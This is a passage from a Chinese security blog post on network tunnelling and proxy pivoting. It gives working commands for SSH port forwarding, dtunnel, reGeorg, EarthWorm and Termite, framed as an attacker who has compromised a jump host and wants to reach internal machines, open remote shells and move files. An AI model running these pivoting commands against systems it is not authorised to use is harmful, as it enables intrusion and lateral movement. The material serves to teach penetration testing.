<p>dtunnel -buster 1.2.3.4:8018 -remote 1.2.3.4:8888 -mode 0 -reg redis -local :6379 -addip 127.0.0.1 -clientkey password -ssl=false</p>
<p>如果需要开启SOCKS5服务，修改-local参数即可，近端无需修改</p>
<p>dtunnel -buster 1.2.3.4:8018 -remote 1.2.3.4:8888 -mode 0 -reg redis -local socks5 -addip 127.0.0.1 -clientkey password -ssl=false</p>
</blockquote>
<ol start="3">
<li>近端客户端连接客户端：</li>
</ol>
<blockquote>
<p>dtunnel -buster 1.2.3.4:8018 -remote 1.2.3.4:8888 -mode 0 -link redis -local :9999 -addip 127.0.0.1 -clientkey password -ssl=false -encrypt</p>
</blockquote>
</li>
<li><p>客户端参数说明：</p>
<ul>
<li><p>-addip：出口IP(单个或列表)，注意:对于多公网ip的终端，请用-stun参数指定stun服务器辅助连接，或者用-addip参数手工指定出口ip列表，默认是：127.0.0.1</p>
</li>
<li><p>-remote：远程服务器，用于C/S模式，对应服务端-addr地址端口</p>
</li>
<li><p>-buster：打洞服务器，用于P2P模式，对应服务端-addrudp端口地址</p>
</li>
<li><p>-clientkey：客户端Key，用于远端和近端认证，需一致</p>
</li>
<li><p>-reg：注册名，远端使用</p>
</li>
<li><p>-link：连接的注册名，近端使用，用于识别连接远端</p>
</li>
<li><p>-local：本地监听端口，填socks5则为socks5代理服务</p>
</li>
<li><p>-encrypt：P2P模式加密，近端才能使用</p>
</li>
<li><p>-mode：连接模式(0:P2P打洞失败后切换为C/S 1:只使用P2P 2:只使用C/S)</p>
</li>
<li><p>-compress：压缩数据，远端和近端需一致</p>
</li>
<li><p>-debug：调试模式</p>
</li>
<li><p>-delay：打洞失败后重试延迟，秒</p>
</li>
<li><p>-dnscache：DNS缓存有效期，如果大于0将定时清空DNS缓存，分钟</p>
</li>
<li><p>-f：从文件中加载配置</p>
</li>
<li><p>-kcp：kcp配置，远端和近端需一致</p>
</li>
<li><p>-key：访问Key(服务端数据库中的AuthKey)</p>
</li>
<li><p>-pipen：管道数</p>
</li>
<li><p>ds：数据纠错？仅在P2P模式有效，远端和近端需一致</p>
</li>
<li><p>-ps：奇偶校验？仅在P2P模式有效，远端和近端需一致</p>
</li>
<li><p>-ssl：启用ssl支持，默认启用，服务端没有启用的话请使用-ssl=false来关闭，有bug，必须加上-ssl=false来关闭ssl</p>
</li>
<li><p>-v：输出详细日志</p>
</li>
<li><p>-version：显示版本</p>
</li>
</ul>
<ol start="4">
<li>访问：访问近端（本地）9999端口即可连接到远端6379端口。或者通过本地9999端口连接SOCKS5服务器： </li>
</ol>
<blockquote>
<p>nc 127.0.0.1 9999</p>
<p>或者</p>
<p>curl ip.cn -x socks5://127.0.0.1:9999</p>
</blockquote>
</li>
</ul>
<h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>应用层位于TCP/IP协议的最顶层，通常用于搭建各种应用服务，而基于应用层搭建的隧道技术就是利用各种应用所占用的端口进行搭建，比如有SSH、HTTP/HTTPS和DNS服务，这些服务是服务器经常用到不会被禁止的协议。</p>
<h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><p>SSH是英文Secure Shell的简写形式,SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登陆会话和其他网络服务提供安全性的协议。ftp、pop和telnet在本质上都是不安全的，因为它们在网络上用明文传送口令和数据，别有用心的人非常容易就可以截获这些口令和数据。而且，这些服务程序的安全认证方式也是有其弱点的， 就是很容易受到“中间人”攻击，SSH目前包括 SSH1和SSH2两个版本，是目前最常用的安全通讯协议。通常情况下，ssh协议是允许通过防火墙和边界设备。</p>
<p>尤其是取得高权限shell时屡试不爽</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh<br>usage: ssh [?] [-b bind_address] [-c cipher_spec]<br>           [-D [bind_address:]port] [-E log_file] [-e escape_char]<br>           [-F configfile] [-I pkcs11] [-i identity_file]<br>           [-J [user@]host[:port]] [-L address] [-l login_name] [-m mac_spec]<br>           [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address]<br>           [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]]<br>           [user@]hostname [command]<br></code></pre></td></tr></table></figure>

<h5 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h5><p>A是攻击者，B和C在一个内网，A可以访问B(B具有公网IP)，但不可以访问C</p>
<p><strong>A上执行：</strong></p>
<blockquote>
<p>ssh -CfNg -L A监听端口 : C内网IP : 目标端口  root@B          -f转入后台 -N建立静默连接，两参数常配合使用</p>
</blockquote>
<blockquote>
<p> ssh -CfNg -L 1234:192.168.254.155:3389 <a href="mailto:&#114;&#x6f;&#111;&#116;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#x32;&#53;&#52;&#x2e;&#x31;&#x32;&#x38;">&#114;&#x6f;&#111;&#116;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#x32;&#53;&#52;&#x2e;&#x31;&#x32;&#x38;</a></p>
</blockquote>
<p>可能会一时难以理解，在本地监听一个端口，所有访问这个端口的流量都会通过SSH隧道传输到远端的对应端口，ssh本地转发也是正向的。</p>
<p>A-128，B-130，C-155</p>
<h5 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h5><p>A是攻击者的VPS，攻陷B，B和C同一内网没有公网IP</p>
<p><strong>跳板B上执行：</strong></p>
<blockquote>
<p>ssh -CfNg -R A端口 :  C内网IP : C目标端口 root@A</p>
</blockquote>
<blockquote>
<p>ssh -CfNg -R 10086:192.168.254.155:3389 <a href="mailto:&#x72;&#x6f;&#x6f;&#116;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#50;&#x35;&#52;&#46;&#x31;&#x32;&#56;">&#x72;&#x6f;&#x6f;&#116;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#50;&#x35;&#52;&#46;&#x31;&#x32;&#56;</a></p>
</blockquote>
<p>然后在VPS上就可以访问C3389，这是反向的</p>
<p>理解不清楚的参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/170597122">https://zhuanlan.zhihu.com/p/170597122</a></p>
<h5 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h5><p>你的Linux A，以及一台海外服务器B，ssh动态转发建立socks4/5后可用于翻墙</p>
<blockquote>
<p>ssh -qTfnN -D 端口 root@B </p>
</blockquote>
<p>然后使用proxychains使用该socks隧道即可</p>
<h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><p>首先查看内部域名及ip地址</p>
<blockquote>
<p>cat /etc/resolv.conf | grep -v “#”</p>
</blockquote>
<p>查看是否与内部DNS通信解析外部域名</p>
<blockquote>
<p>nslookup baidu.com</p>
</blockquote>
<p>可以参考文章搭建：</p>
<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/144987.html">https://www.secpulse.com/archives/144987.html</a></p>
<p>工具推荐：</p>
<p>dnscat2(win可以用dnscat2-powershell)、iodine</p>
<h4 id="HTTP-HTTPS"><a href="#HTTP-HTTPS" class="headerlink" title="HTTP/HTTPS"></a>HTTP/HTTPS</h4><h5 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a><a target="_blank" rel="noopener" href="https://github.com/sensepost/reGeorg">reGeorg</a></h5><p>reGeorg 是 reDuh 的升级版，主要功能是把内网服务器端口的数据通过 HTTP/HTTPS 隧道转发到本机，实现基于 HTTP 协议的通信。 </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">python2 reGeorgSocksProxy.py -h<br><br>usage: reGeorgSocksProxy.py [-h] [-l] [-p] [-r] -u  [-v]                      <br>                                                                              <br>Socks server for reGeorg HTTP(s) tunneller                                    <br>                                                                              <br>optional arguments:                                                           <br>  -h, --help           show this help message and exit                        <br>  -l , --listen-on     The default listening address                          <br>  -p , --listen-port   The default listening port                             <br>  -r , --read-buff     Local read buffer, max data to be sent per POST        <br>  -u , --url           The url containing the tunnel script                   <br>  -v , --verbose       Verbose output[INFO|DEBUG]                             <br></code></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220304133010463.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220304140512685.png" srcset="/img/loading.gif" lazyload></p>
<p>win下可以使用代理工具proxifier</p>
<p>linux下用proxychains</p>
<p><strong>在指定代理类型时，如果指定socks4，将不能使用ping命令，后续介绍</strong></p>
<p>指定某些程序由127.0.0.1:1234代理，就将流量转发到内网</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220304135427676.png" srcset="/img/loading.gif" lazyload></p>
<p>有http请求，请求中的参数为cmd,target,port</p>
<p>由于regeorg脚本特征非常明显，很多杀软都会对其进行查杀</p>
<h2 id="代理技术"><a href="#代理技术" class="headerlink" title="代理技术"></a>代理技术</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/vpn.jpeg" srcset="/img/loading.gif" lazyload></p>
<h3 id="代理类型"><a href="#代理类型" class="headerlink" title="代理类型"></a>代理类型</h3><p>代理分为正向代理和反向代理</p>
<h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a><strong>正向代理</strong></h4><p>通常我们说的代理，都是指的正向代理。</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-3efba166d9c57f233999dec4abb5bdfb_720w-165293759153410.jpg" srcset="/img/loading.gif" lazyload></p>
<p>继续看这张图，你会发现，此处的代理服务器可以由客户端提供，也可以由服务器端提供。</p>
<p>当客户端主动使用代理服务器时，此时的代理叫正向代理。比如：一些网络代理工具（加速器/VPN…）</p>
<h5 id="完整流程"><a href="#完整流程" class="headerlink" title="完整流程"></a><strong>完整流程</strong></h5><p>正向代理时，由客户端发送对某一个目标服务器的请求，代理服务器在中间将请求转发给该目标服务器，目标服务器将结果返回给代理服务器，代理服务器再将结果返回给客户端。</p>
<p>使用正向代理时，客户端是需要配置代理服务的地址、端口、账号密码（如有）等才可使用的。</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-4880f5f7d29e9669f3548ae6f00b4bdf_720w.jpg" srcset="/img/loading.gif" lazyload></p>
<p>通过上图可以看到，客户端并没有直接与服务器相连。正向代理隐藏了真实的客户端地址。可以很好地保护客户端的安全性。</p>
<h5 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h5><ul>
<li><p><strong>访问被禁止的资源</strong>（让客户端访问原本不能访问的服务器。可能是由于路由的原因，或者策略配置的原因，客户端不能直接访问某些服务器。为了访问这些服务器，可通过代理服务器来访问）</p>
<ul>
<li><p>突破网络审查（比如谷歌、youtube…）</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-0b8beb6ccd71b1f232343a4900aa2471_720w.jpg" srcset="/img/loading.gif" lazyload></p>
</li>
<li><p>再比如客户端IP被服务器封禁，可以绕过IP封禁</p>
</li>
<li><p>也可以突破网站的区域限制</p>
</li>
</ul>
</li>
<li><p><strong>隐藏客户端的地址</strong>（对于被请求的服务器而言，代理服务器代表了客户端，所以在服务器或者网络拓扑上，看不到原始客户端）</p>
</li>
<li><p><strong>进行客户访问控制</strong></p>
<ul>
<li>可以集中部署策略，控制客户端的访问行为（访问认证等）</li>
<li>记录用户访问记录（上网行为管理）</li>
<li>内部资源的控制（公司、教育网等）</li>
</ul>
</li>
<li><p><strong>加速访问资源</strong></p>
<ul>
<li>使用缓冲特性减少网络使用率（代理服务器设置一个较大的缓冲区，当有外界的信息通过时，同时也将其保存到缓冲区中，当其他用户再访问相同的信息时， 则直接由缓冲区中取出信息，传给用户，以提高访问速度。）</li>
</ul>
</li>
<li><p><strong>过滤内容</strong>（可以通过代理服务器统一过滤一些危险的指令/统一加密一些内容、防御代理服务器两端的一些攻击性行为）</p>
</li>
</ul>
<h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a><strong>反向代理</strong></h4><p>服务器根据客户端的请求，从其关系的一组或多组后端服务器（如Web服务器）上获取资源，然后再将这些资源返回给客户端，客户端只会得知代理服务器的IP地址，而不知道在代理服务器后面的服务器集群的存在。</p>
<h5 id="完整流程-1"><a href="#完整流程-1" class="headerlink" title="完整流程"></a>完整流程</h5><p>由客户端发起对代理服务器的请求，代理服务器在中间将请求转发给某一个服务器，服务器将结果返回给代理服务器，代理服务器再将结果返回给客户端。</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-d70c2447834f518a04d6c34ce7574231_720w-165293785745817.jpg" srcset="/img/loading.gif" lazyload></p>
<h5 id="适用场景-1"><a href="#适用场景-1" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h5><ul>
<li><p><strong>负载均衡</strong></p>
<ul>
<li>如果服务器集群中有负荷较高者，反向代理通过URL重写，根据连线请求从负荷较低者获取与所需相同的资源或备援。可以有效降低服务器压力，增加服务器稳定性</li>
</ul>
</li>
<li><p><strong>提升服务器安全性</strong></p>
<ul>
<li><p>可以对客户端隐藏服务器的IP地址</p>
</li>
<li><p>也可以作为应用层防火墙，为网站提供对基于Web的攻击行为（例如DoS/DDoS）的防护，更容易排查恶意软件等</p>
</li>
</ul>
</li>
<li><p><strong>加密/SSL加速：</strong>将SSL加密工作交由配备了SSL硬件加速器的反向代理来完成</p>
</li>
<li><p><strong>提供缓存服务</strong>，加速客户端访问</p>
<ul>
<li>对于静态内容及短时间内有大量访问请求的动态内容提供缓存服务</li>
</ul>
</li>
<li><p><strong>数据统一压缩</strong></p>
<ul>
<li><p>节约带宽</p>
</li>
<li><p>为网络带宽不好的网络提供服务</p>
</li>
</ul>
</li>
<li><p><strong>统一的访问权限控制</strong></p>
</li>
<li><p><strong>统一的访问控制</strong></p>
</li>
<li><p><strong>突破互联网的封锁</strong></p>
<ul>
<li>突破谷歌访问封锁</li>
</ul>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-c1e97a220e4b5e23ca15faf2f687f206_720w.jpg" srcset="/img/loading.gif" lazyload></p>
<p>也就是说，不需要客户端进行代理，我们通过谷歌代理网站（该代理服务器可以访问谷歌，而我们可以访问该公开的代理服务器），也可以突破封锁。</p>
<ul>
<li><strong>为在私有网络下</strong>（如局域网）的服务器集群提供NAT穿透及外网发布服务</li>
<li><strong>上传下载减速控制</strong></li>
</ul>
<h3 id="代理情景"><a href="#代理情景" class="headerlink" title="代理情景"></a>代理情景</h3><p>前言道，lcx等端口转发技术</p>
<p>适用端口转发的网络环境有以下几种：</p>
<ol>
<li><p>   服务器处于内网，可以访问外部网络。</p>
</li>
<li><p>   服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。</p>
</li>
<li><p>   服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。</p>
</li>
</ol>
<p>对于以上三种情况，lcx可以突破1和2二种，但是第3种就没有办法了，因为lcx在使用中需要访问外部网络。</p>
<p>那么这里就要讲到<strong>socks协议(防火墙安全会话转换协议)</strong></p>
<p>socks代理服务可以简单地将一端的系统连接到另外一端。支持多种协议，包括http、ftp请求及其它类型的请求。</p>
<p>其工作于OSI第五层——会话层，介于传输层和表示层，因此不提供如<strong>传递ICMP信息</strong>之类的网络层服务</p>
<p>在实际渗透测试过程中，当我们成功的拿下第一台堡垒机后，此时我们又想对目标内网进一步渗透测试时，socks能够帮助我们更加快速的，方便的访问目标内网的各种资源，比传统的端口转发更加实用。</p>
<p>目前有两个版本：SOCKS4和SOCKS5</p>
<p>SOCKS4支持TELNET、FTPHTTP等TCP协议；SOCKS5支持TCP与UDP，并支持安全认证方案。</p>
<p>基于socks协议的转发代理工具：</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/beepress-image-140684-1599633756.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>1.Earthworm</strong>   工具网址：<a target="_blank" rel="noopener" href="http://rootkiter.com/EarthWorm">http://rootkiter.com/EarthWorm</a> </p>
<p>EW 是一套便携式的网络穿透工具，具有 SOCKS  v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内,强烈推荐使用。</p>
<p>目前已经有了最新版Termite，工具网址：<a target="_blank" rel="noopener" href="http://rootkiter.com/Termite/">http://rootkiter.com/Termite/</a> </p>
<p><strong>2.reGeorg</strong>     工具网址：<a target="_blank" rel="noopener" href="https://github.com/NoneNotNull/reGeorg">https://github.com/NoneNotNull/reGeorg</a> </p>
<p>reGeorg是reDuh的升级版，主要是把内网服务器的端口通过http/https隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。它利用webshell建立一个socks代理进行内网穿透，服务器必须支持aspx、php或jsp这些web程序中的一种。</p>
<p><strong>3.sSocks</strong>      工具网址：<a target="_blank" rel="noopener" href="http://sourceforge.net/projects/ssocks/">http://sourceforge.net/projects/ssocks/</a> </p>
<p>sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试，其最新版为0.0.13。</p>
<p><strong>4.SocksCap64</strong>   工具网址：<a target="_blank" rel="noopener" href="http://www.sockscap64.com/">http://www.sockscap64.com</a> (需翻墙)</p>
<p>SocksCap64是一款在windows下相当好使的全局代理软件。SocksCap64可以使Windows应用程序通过SOCKS代理服务器来访问网络而不需要对这些应用程序做任何修改, 即使某些本身不支持SOCKS代理的应用程序通过SocksCap64之后都可以完美的实现代理访问。</p>
<p><strong>5.proxychains</strong>   工具网址：<a target="_blank" rel="noopener" href="http://proxychains.sourceforge.net/">http://proxychains.sourceforge.net/</a> </p>
<p>Proxychains是一款在LINUX下可以实现全局代理的软件，性能相当稳定可靠。在使任何程序通过代理上网，允许TCP和DNS通过代理隧道，支持HTTP、SOCKS4、SOCKS5类型的代理服务器，支持proxy chain，即可配置多个代理，同一个proxy chain可使用不同类型的代理服务器。</p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="sSocks"><a href="#sSocks" class="headerlink" title="sSocks"></a>sSocks</h4><ul>
<li><p>sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试。官方地址：<a target="_blank" rel="noopener" href="http://sourceforge.net/projects/ssocks/">sSocks (Socks5 Server) download | SourceForge.net</a></p>
</li>
<li><p>下载解压后，执行命令编译</p>
<blockquote>
<p>./configure &amp;&amp; make</p>
</blockquote>
</li>
<li><p>编译完成，进入src目录，会发现有nsocks、ssocksd、ssocks、rcsocks，其功能说明介绍如下：</p>
<ul>
<li>nsocks：类似通过Socks5代理后的netcat，可用来测试socks server</li>
<li>ssocksd：用来开启Socks5代理服务</li>
<li>rssocks：本地启用Socks5服务，并反弹到另一IP地址</li>
<li>rcsocks：接收反弹过来的Socks5服务，并转向另一端口</li>
</ul>
</li>
</ul>
<p>使用方法<strong>和nc差不多用，只不过分开了服务端和客户端</strong></p>
<ol>
<li>公网主机上执行：</li>
</ol>
<blockquote>
<p><strong>rc</strong>socks -l 80 -p 443 -vv</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220327132529954.png" srcset="/img/loading.gif" lazyload></p>
<ol start="2">
<li>内网主机上执行：</li>
</ol>
<blockquote>
<p><strong>rs</strong>socks –vv –socks 公网主机ip:443</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220327132806331.png" srcset="/img/loading.gif" lazyload></p>
<p>启一个1000监听(浏览器访问了一下，如下)</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220327132914780.png" srcset="/img/loading.gif" lazyload></p>
<ol start="3">
<li>这时本地主机可以通过访问公网主机的80 端口访问内网主机：</li>
</ol>
<blockquote>
<p>curl –socks5 公网IP:80 内网:1000</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220327133336510.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h4><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85494">https://www.anquanke.com/post/id/85494</a></p>
<p>关于 EW 的介绍</p>
<p>下图是一张示意图:</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220305154115425.png" srcset="/img/loading.gif" lazyload></p>
<p>该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。</p>
<p>工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内</p>
<p>使用方法：</p>
<p>以下所有样例，如无特殊说明代理端口均为1080，服务均为SOCKSv5代理服务.</p>
<p>该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）</p>
<ul>
<li>正向SOCKS v5服务器</li>
</ul>
<p>直接公网服务器上面执行，将其作为SOCKS5服务器使用，我们就可以添加使用… //如果这个服务器在境外，那么就成功翻墙了</p>
<blockquote>
<p>./ew -s ssocksd -l 1080</p>
</blockquote>
<p>这是一个<strong>正向代理</strong>过程</p>
<ul>
<li>反弹 SOCKS v5 服务器</li>
</ul>
<p>这个操作具体分两步：</p>
<p>a) 先在一台具有公网 ip 的主机A上运行以下命令：</p>
<blockquote>
<p>./ew -s rcsocks -l 80 -e 443 </p>
</blockquote>
<p>b) 在无公网的跳板机B(192.168.254.128)上启动 SOCKS v5 服务并反弹到公网主机的 443端口</p>
<blockquote>
<p>./ew -s rssocks -d 1.1.1.1 -e 443 </p>
</blockquote>
<p>c) 访问无公网的目标主机c(192.168.254.130)等等</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220519140717831.png" srcset="/img/loading.gif" lazyload></p>
<p>这是<strong>反向代理</strong></p>
<ul>
<li>多级级联</li>
</ul>
<p> 工具中自带的三条端口转发指令，它们的参数格式分别为：</p>
<blockquote>
<p>./ew -s lcx_listen -l 1080 -e 8888<br>./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999<br>./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999</p>
</blockquote>
<p> 通过这些端口转发指令可以将处于网络深层的基于TCP的服务转发至根前,比如 SOCKS v5。</p>
<p> 首先提供两个“二级级联”本地SOCKS测试样例：</p>
<p>  a) lcx_tran 的用法</p>
<blockquote>
<p>./ew -s ssocksd -l 9999<br>./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999</p>
</blockquote>
<p><strong>端口转发+正向代理</strong></p>
<p>如图：centos与kali在同一内网：kali具有公网ip，内网只可以连接centos，外网不可直接访问centos(往往目标不出网)</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220326220356565.png" srcset="/img/loading.gif" lazyload></p>
<p>此时可以访问kali x.x.x.128:2333来使用centos架设的socks5代理</p>
<p>同样的情景：境外vps启了一个容器，防火墙策略组的存在，8000端口无法访问，也可以直接在有公网的机器架设socks5服务</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220326125535619.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220326125347604.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220326110539622.png" srcset="/img/loading.gif" lazyload></p>
<p>这是正向代理还是反向代理呢？</p>
<p>正向代理？如果站在目标服务器的角度，它没有说明出网还是不出网，也没有sock5监听，只是在与目标服务器等同地位的，具有公网ip的服务器架设了socks5服务，这看起来和翻墙是等价的，即视为正向代理？</p>
<p>反向代理？目标服务器也没有对我们服务器连接的一个操作</p>
<p>这其实是非常简单的一种网络环境，应该视为反向代理，把vps视为目标边界且具有公网ip的一台服务器，该容器是和服务器在同一内网的机器，在公网机器起了一个socks5服务，并且能够通过公网访问到容器，完全就等价于内网穿透，而内网穿透本质就是反向代理</p>
<p>说白了就是要看目的以及目标的网络地位和服务，上面说这台机子如果是境外的，那么就实现了翻墙，但是翻墙的目标并不是这个内网机器，而是广域的被网络审查的机器</p>
<p>  b) lcx_listen、lcx_slave 的用法</p>
<blockquote>
<p>./ew -s lcx_listen -l 1080 -e 8888<br>./ew -s ssocksd -l 9999<br>./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220326224539.png" srcset="/img/loading.gif" lazyload></p>
<p> 再提供一个“三级级联”的本地SOCKS测试用例以供参考</p>
<blockquote>
<p>./ew -s rcsocks -l 1080 -e 8888<br>./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999<br>./ew -s lcx_listen -l 9999 -e 7777<br>./ew -s rssocks -d 127.0.0.1 -e 7777</p>
</blockquote>
<p> 数据流向: SOCKS v5 -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</p>
<p>补充说明：</p>
<p>为了减少网络资源的消耗，程序中添加了超时机制，默认时间为10000毫秒（10秒），用户可以通过追加 -t 参数来调整这个值，单位为毫秒。在多级级联功能中，超时机制将以隧道中最短的时间为默认值。</p>
<p>多级级联的三种状态可以转发任意以TCP为基础的通讯服务，包括远程桌面／ssh服务 等</p>
<h4 id="Termite"><a href="#Termite" class="headerlink" title="Termite"></a>Termite</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0nth3way/p/11690810.html">https://www.cnblogs.com/0nth3way/p/11690810.html</a></p>
<ol>
<li>以服务模式启动一个agent服务。</li>
</ol>
<blockquote>
<p> ./agent -l 8888</p>
</blockquote>
<ol start="2">
<li>令管理端连接到agent并对agent进行管理。</li>
</ol>
<blockquote>
<p>./admin -c 127.0.0.1 -p 8888</p>
</blockquote>
<ol start="3">
<li>此时，admin端会得到一个内置的shell, 输入help指令可以得到帮助信息。</li>
</ol>
<blockquote>
<p>help</p>
</blockquote>
<ol start="4">
<li>通过show指令可以得到当前agent的拓扑情况。</li>
</ol>
<blockquote>
<p>show<br>0M<br>+– 1M</p>
<p>由于当前拓扑中只有一个agent，所以展示结果只有 1M ,其中1 为节点的ID号，M为MacOS系统的简写，Linux为L，Windows简写为W。</p>
</blockquote>
<ol start="5">
<li><p>将新agent加入当前拓扑</p>
<blockquote>
<p>./agent -c 127.0.0.1 -p 8888</p>
</blockquote>
</li>
<li><p>此时show指令将得到如下效果</p>
</li>
</ol>
<blockquote>
<p>0M<br>+– 1M<br>|+– 2M<br>  这表明，当前拓扑中有两个节点，其中由于2节点需要通过1节点才能访问，所以下挂在1节点下方。</p>
</blockquote>
<ol start="7">
<li>在2节点开启socks代理，并绑定在本地端口</li>
</ol>
<blockquote>
<p>goto 2<br>将当前被管理节点切换为 2 号节点。<br>socks 1080<br>此时，本地1080 端口会启动个监听服务，而服务提供者为2号节点。</p>
</blockquote>
<ol start="8">
<li><p>在1号节点开启一个shell并绑定到本地端口</p>
<blockquote>
<p>goto 1<br>shell 7777<br>此时，通过nc本地的 7777 端口，就可以得到一个 1 节点提供的 shell.</p>
</blockquote>
</li>
<li><p>将远程的文件下载至本地</p>
<blockquote>
<p>goto 1<br>downfile 1.txt 2.txt<br>将1 节点，目录下的 1.txt 下载至本地，并命名为2.txt</p>
</blockquote>
</li>
<li><p>上传文件至远程节点</p>
<blockquote>
<p>goto 2<br>upfile 2.txt 3.txt<br>将本地的 2.txt 上传至 2号节点的目录，并命名为3.txt</p>
</blockquote>
</li>
<li><p>端口转接</p>
<blockquote>
<p>goto 2<br>lcxtran 3388 10.0.0.1 3389<br>以2号节点为跳板，将 10.0.0.1 的 3389 端口映射至本地的 3388 端口</p>
</blockquote>
</li>
</ol>
<h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p><strong>内网穿透的本质属于反向代理</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">frp</a></p>
<p>直接利用ss翻墙容易被ban掉ip，可以frp中转</p>
<p><a target="_blank" rel="noopener" href="https://calxu.github.io/note/20200301_vpn_2/">https://calxu.github.io/note/20200301_vpn_2/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps">nps</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/network/">network</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
